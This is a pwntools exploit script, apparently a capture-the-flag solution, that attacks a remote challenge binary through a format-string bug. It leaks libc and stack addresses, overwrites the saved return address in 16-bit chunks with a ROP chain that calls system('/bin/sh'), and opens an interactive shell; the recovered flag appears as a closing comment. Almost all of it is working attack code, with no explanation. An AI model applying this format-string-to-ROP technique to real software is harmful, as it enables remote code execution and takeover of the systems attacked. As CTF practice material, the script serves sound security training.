from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

'''
read
printf
cmp
'''

script = '''
breakrva 0x12CF
breakrva 0x1391
breakrva 0x1379
'''

def fmt_str(payload):
    cnt = 0
    for i in range(len(payload)):
        e = chr(payload[i])
        if(e == "n" or e == "x" or e == "X" or e == "p"):
            cnt += 1
    payload += b"n" * (0x100 - cnt)
    
    payload = payload.ljust(0x500, b"\x00")
    p.send(payload)

def overwrite(addr, val):
    l = []
    l.append([val & 0xffff, 0])
    val = val >> 16
    l.append([val & 0xffff, 2])
    val = val >> 16
    l.append([val & 0xffff, 4])
    l = sorted(l, key = lambda x: x[0])
    payload  = f'%{l[0][0]}c%106$hn'.encode()
    payload += f'%{l[1][0] - l[0][0]}c%107$hn'.encode()
    payload += f'%{l[2][0] - l[1][0]}c%108$hn'.encode()
    
    cnt = 0
    for i in range(len(payload)):
        e = chr(payload[i])
        if(e == "n" or e == "x" or e == "X" or e == "p"):
            cnt += 1
    payload += b"n" * (0x100 - cnt)

    payload = payload.ljust(0x300, b"\x00") + p64(addr + l[0][1]) + p64(addr + l[1][1]) + p64(addr + l[2][1])
    payload = payload.ljust(0x500, b"\x00")
    p.send(payload)

p = remote("chall.ctf.k1nd4sus.it", 31001)
#p = process("./chall_patched")
#p = gdb.debug("./n_less_behavior", gdbscript = script)

p.recvuntil(b"enjoy")
payload = b"%173$p.%175$p."
fmt_str(payload)

libc_base = int(p.recvuntil(b".")[:-1:], 16) - 0x2a1ca
rbp = int(p.recvuntil(b".")[:-1:], 16) - 0x128

system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
pop_rdi = libc_base + 0x000000000010f75b
ret = pop_rdi + 1

#gdb.attach(p, gdbscript = script)
overwrite(rbp + 0x8, pop_rdi)
overwrite(rbp + 0x10, binsh)
overwrite(rbp + 0x18, ret)
overwrite(rbp + 0x20, system)

payload = b"END\x00"
p.send(payload)

p.interactive()
#KSUS{th3_c0nv3rs4t10n_w4snt_n_l3ss_4ft3r_4ll}